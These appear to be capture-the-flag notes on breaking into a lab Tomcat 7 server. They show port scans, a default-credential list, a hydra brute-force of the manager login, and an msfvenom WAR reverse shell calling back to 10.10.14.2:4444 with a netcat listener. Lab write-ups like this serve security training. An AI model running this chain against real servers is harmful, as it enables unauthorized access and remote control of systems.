
# Nmap

```bash
> nmap -Pn -p- --min-rate 4000 10.10.10.95
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-02 14:52 +0700
Stats: 0:00:30 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 92.60% done; ETC: 14:52 (0:00:02 remaining)
Nmap scan report for 10.10.10.95
Host is up (0.17s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

```bash
> nmap -p8080 -sCV -Pn 10.10.10.95
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-02 14:52 +0700
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.10.95
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
```

# Apache Tomcat Default Credentials

```
admin : admin
ADMIN : ADMIN
admin : j5Brn9
admin : None
admin : tomcat
cxsdk : kdsxc
j2deployer : j2deployer
ovwebusr : OvW*busr1
QCC : QLogic66
role : changethis
role1 : role1
role1 : tomcat
root : root
tomcat : changethis
tomcat : s3cret
tomcat : tomcat
xampp : xampp
```

# Hydra

```bash
> hydra -L user.txt -P password.txt 10.10.10.95 -s 8080 http-get /manager/html

..SNIP..

[DATA] attacking http-get://10.10.10.95:8080/manager/html
[8080][http-get] host: 10.10.10.95   login: admin   password: admin
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
```

# Deploy War Files

```bash
> msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.2 lport=4444 -f war -o hello.war

> jar -tvf hello.war
     0 Tue Sep 02 15:08:36 WIB 2025 META-INF/
    71 Tue Sep 02 15:08:36 WIB 2025 META-INF/MANIFEST.MF
     0 Tue Sep 02 15:08:36 WIB 2025 WEB-INF/
   263 Tue Sep 02 15:08:36 WIB 2025 WEB-INF/web.xml
148995 Tue Sep 02 15:08:36 WIB 2025 tferqpxz.jsp

# browse to the deployed application and access the jsp file.

> rlwrap nc -nvlp 4444
Connection from 10.10.10.95:49193
```
